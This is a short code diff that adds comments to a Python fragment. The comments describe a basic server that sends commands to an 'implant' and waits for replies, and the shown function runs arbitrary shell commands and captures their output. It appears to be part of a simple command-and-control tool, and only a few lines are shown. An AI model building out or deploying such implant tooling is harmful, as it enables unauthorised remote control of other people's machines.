@@ -1,6 +1,10 @@
 import socket
 import subprocess
 
+# Super basic server.
+# This server will wait for a connection from the implant. 
+# It will send the command and wait for a response. 
+
 def execute_command(command, client_socket):
     try:
         output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
